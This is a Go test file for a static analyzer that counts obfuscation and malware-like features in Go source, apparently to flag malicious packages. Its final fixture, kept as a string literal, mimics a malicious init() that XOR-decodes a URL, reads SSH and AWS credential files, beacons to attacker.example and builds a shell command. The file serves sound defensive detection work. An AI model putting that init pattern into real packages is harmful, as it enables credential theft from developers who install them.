package golang

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ============================================================
// XOR-assignment tests
// ============================================================

func TestAnalyze_SingleXORAssignment_Counts(t *testing.T) {
	t.Parallel()

	src := `package main

func init() {
	x := byte(0)
	x ^= byte(42)
	_ = x
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.XORAssignments)
}

func TestAnalyze_XORDecodeLoop_CountsEachAssignment(t *testing.T) {
	t.Parallel()

	// Canonical XOR-decode loop body. Each iteration's `^=` is one
	// AssignStmt; the loop expands to a single stmt at AST level
	// (the for-stmt body), not multiple. So this counts as 1.
	// Multiple `^=` in the SAME source counts as multiple
	// AssignStmt nodes (next test).
	src := `package main

func decode(data, key []byte) []byte {
	for i := range data {
		data[i] ^= key[i%len(key)]
	}
	return data
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.XORAssignments)
}

func TestAnalyze_MultipleXORAssignments_AllCounted(t *testing.T) {
	t.Parallel()

	src := `package main

func init() {
	x := byte(0)
	x ^= 1
	x ^= 2
	x ^= 3
	_ = x
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 3, feats.XORAssignments)
}

func TestAnalyze_BinaryXORNotAssignment_NotCounted(t *testing.T) {
	t.Parallel()

	// `data[i] = data[i] ^ key[i]` is a regular `=` assignment with
	// a binary `^` on the RHS; v0.1 only counts `^=` (compound op).
	// Documented gap; closing it requires distinguishing legitimate
	// bit-twiddling from XOR-decode loops via context analysis.
	src := `package main

func decode(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 0, feats.XORAssignments)
}

func TestAnalyze_StringContainingXORCompound_NotCounted(t *testing.T) {
	t.Parallel()

	// AST-vs-regex defense: a string literal containing "x ^= y"
	// must not count. *ast.AssignStmt isn't created from string
	// content.
	src := `package main

const example = "x ^= y is the XOR-compound assignment"

func init() {
	_ = example
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 0, feats.XORAssignments)
}

func TestAnalyze_LegitimateXORInCryptoCode_StillCounts(t *testing.T) {
	t.Parallel()

	// XOR is used legitimately in crypto / hash code. The matrix
	// surfaces the count; the analyst classifies. The spike row is
	// suspicious only when joined with init+network+sensitive
	// features (the multi-feature-joint anomaly threshold).
	src := `package main

import "crypto/cipher"

func cbcDecrypt(b cipher.Block, dst, src []byte, iv []byte) {
	prev := iv
	for i := 0; i < len(src); i += b.BlockSize() {
		block := src[i : i+b.BlockSize()]
		dstBlock := dst[i : i+b.BlockSize()]
		b.Decrypt(dstBlock, block)
		for j := range dstBlock {
			dstBlock[j] ^= prev[j]
		}
		prev = block
	}
}
`
	feats := analyzeOne(t, "main.go", src)
	// XOR fires (1 ^= in the inner loop body); init does not (no
	// init() function). The matrix has features but no anomaly
	// trigger from this file alone.
	assert.Equal(t, 1, feats.XORAssignments)
	assert.Equal(t, 0, feats.InitCount)
}

// ============================================================
// Base64 decode tests
// ============================================================

func TestAnalyze_Base64StdEncodingDecodeString_Counts(t *testing.T) {
	t.Parallel()

	src := `package main

import "encoding/base64"

func init() {
	_, _ = base64.StdEncoding.DecodeString("aGVsbG8=")
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.Base64DecodeCalls)
}

func TestAnalyze_Base64URLEncodingDecode_Counts(t *testing.T) {
	t.Parallel()

	src := `package main

import "encoding/base64"

func init() {
	dst := make([]byte, 64)
	_, _ = base64.URLEncoding.Decode(dst, []byte("aGVsbG8="))
	_ = dst
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.Base64DecodeCalls)
}

func TestAnalyze_Base64NewDecoder_Counts(t *testing.T) {
	t.Parallel()

	src := `package main

import (
	"encoding/base64"
	"strings"
)

func init() {
	r := base64.NewDecoder(base64.StdEncoding, strings.NewReader("aGVsbG8="))
	_ = r
}
`
	feats := analyzeOne(t, "main.go", src)
	// base64.NewDecoder counts. Note that the second arg references
	// base64.StdEncoding but as a value, not a call — no Decode is
	// invoked through that selector here.
	assert.Equal(t, 1, feats.Base64DecodeCalls)
}

func TestAnalyze_Base64EncodeToString_NotCounted(t *testing.T) {
	t.Parallel()

	// Encoding base64 (the inverse direction) is benign for
	// analytics/logging contexts. Catalog deliberately excludes
	// EncodeToString / Encode / NewEncoder.
	src := `package main

import "encoding/base64"

func init() {
	_ = base64.StdEncoding.EncodeToString([]byte("hello"))
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 0, feats.Base64DecodeCalls)
}

func TestAnalyze_Base64LocalVarDecodeString_NotCountedV01(t *testing.T) {
	t.Parallel()

	// `enc := base64.StdEncoding; enc.DecodeString(s)` binds the
	// *Encoding value to a local; v0.1 doesn't track this. Gap is
	// documented in the catalog comment.
	src := `package main

import "encoding/base64"

func init() {
	enc := base64.StdEncoding
	_, _ = enc.DecodeString("aGVsbG8=")
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 0, feats.Base64DecodeCalls)
}

func TestAnalyze_StringContainingBase64Decode_NotCounted(t *testing.T) {
	t.Parallel()

	src := `package main

const helpText = "Use base64.StdEncoding.DecodeString to decode."

func init() {
	_ = helpText
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 0, feats.Base64DecodeCalls)
}

func TestPatternsCatalog_Base64DecodeCallSites_NoDuplicates(t *testing.T) {
	t.Parallel()

	seen := make(map[CallSite]struct{}, len(Base64DecodeCallSites))
	for _, cs := range Base64DecodeCallSites {
		_, dup := seen[cs]
		require.Falsef(t, dup, "duplicate CallSite %+v", cs)
		seen[cs] = struct{}{}
	}
	assert.NotEmpty(t, Base64DecodeCallSites)
	for _, cs := range Base64DecodeCallSites {
		assert.NotEmpty(t, cs.Pkg)
		assert.NotEmpty(t, cs.Fn)
	}
}

// ============================================================
// Joint fingerprint tests — the BufferZoneCorp pattern
// ============================================================

func TestAnalyze_BufferZoneCorpObfuscationFingerprint_AllFeaturesSpike(t *testing.T) {
	t.Parallel()

	// Joint-feature fingerprint resembling the BufferZoneCorp
	// grpc-client init payload (simplified): one init() function,
	// XOR-decode loop, base64-encoded constant decoded at runtime,
	// network egress, sensitive-path reads, and exec call. The
	// matrix's anomaly threshold (commit 14) fires when ≥2 features
	// cross from zero baseline; this fixture exhibits all of them
	// at once.
	src := `package main

import (
	"encoding/base64"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

var encodedURL = []byte{0x47, 0x71, 0x16, 0x35, 0x70, 0x47, 0x35, 0x6f}
var xorKey = []byte("grpcconn1")

func init() {
	// XOR-decode the obfuscated URL.
	for i := range encodedURL {
		encodedURL[i] ^= xorKey[i%len(xorKey)]
	}
	// Base64 decode an embedded blob.
	_, _ = base64.StdEncoding.DecodeString("aGVsbG8gd29ybGQ=")
	// Read sensitive paths.
	home, _ := os.UserHomeDir()
	_, _ = os.ReadFile(filepath.Join(home, ".ssh", "id_rsa"))
	_, _ = os.ReadFile(filepath.Join(home, ".aws", "credentials"))
	// Network egress.
	_, _ = http.Post("https://attacker.example/beacon", "application/octet-stream", nil)
	// Spawn external process.
	_ = exec.Command("sh", "-c", "echo pwned")
}
`
	feats := analyzeOne(t, "main.go", src)
	assert.Equal(t, 1, feats.InitCount)
	assert.Equal(t, 1, feats.NetworkCallSites)
	assert.Equal(t, 2, feats.SensitivePathReads)
	assert.Equal(t, 1, feats.ExecCalls)
	assert.Equal(t, 1, feats.XORAssignments)
	assert.Equal(t, 1, feats.Base64DecodeCalls)
}
